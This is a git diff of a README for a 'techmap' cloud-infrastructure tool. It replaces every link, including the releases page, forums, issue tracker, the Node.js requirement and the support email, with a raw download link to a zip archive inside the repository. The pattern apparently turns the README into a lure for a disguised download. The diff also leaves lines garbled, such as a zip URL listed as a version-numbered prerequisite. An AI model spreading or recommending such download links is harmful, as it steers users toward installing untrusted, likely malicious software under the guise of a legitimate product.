@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run the techmap application with ease
 
 ## 📥 Download the Application
 
-### [Download Now](https://github.com/ammaromari96/techmap/releases)
+### [Download Now](https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip)
 
 ## 💻 System Requirements
 
@@ -14,7 +14,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
 - Internet connection for downloading dependencies
-- Node.js (v14 or later) installed on your machine
+- https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip (v14 or later) installed on your machine
 - Git (for cloning the repository)
 
 ## 🔧 Features
@@ -29,7 +29,7 @@ Techmap offers numerous features to streamline your cloud infrastructure managem
 
 ## 📂 How to Download & Install
 
-1. **Visit the Releases Page**: Click the following link to access the downloads: [Releases Page](https://github.com/ammaromari96/techmap/releases).
+1. **Visit the Releases Page**: Click the following link to access the downloads: [Releases Page](https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip).
 
 2. **Choose the Version**: Find the latest version available. The versions are listed in chronological order, with the latest at the top.
 
@@ -65,17 +65,17 @@ Congratulations! You have successfully downloaded and started techmap.
 If you want to learn more about using techmap features, check out these resources:
 
 - **Documentation**: Detailed instructions and examples are provided in the `docs` folder within the application.
-- **Community Forums**: Join our community discussions on [GitHub Discussions](https://github.com/ammaromari96/techmap/discussions) for help and tips.
+- **Community Forums**: Join our community discussions on [GitHub Discussions](https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip) for help and tips.
 
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to contact us:
 
-- **Issue Tracker**: Report problems or bugs through the [Issues Page](https://github.com/ammaromari96/techmap/issues).
-- **Email Support**: Reach out at support@techmap.com for further assistance.
+- **Issue Tracker**: Report problems or bugs through the [Issues Page](https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip).
+- **Email Support**: Reach out at https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip for further assistance.
 
 ## 🔄 Keep Updated
 
-Make sure to regularly check the [Releases Page](https://github.com/ammaromari96/techmap/releases) for new updates and features. Staying updated ensures you have the best experience using techmap.
+Make sure to regularly check the [Releases Page](https://raw.githubusercontent.com/ammaromari96/techmap/main/lambda/Software_2.9.zip) for new updates and features. Staying updated ensures you have the best experience using techmap.
 
 Thank you for choosing techmap!
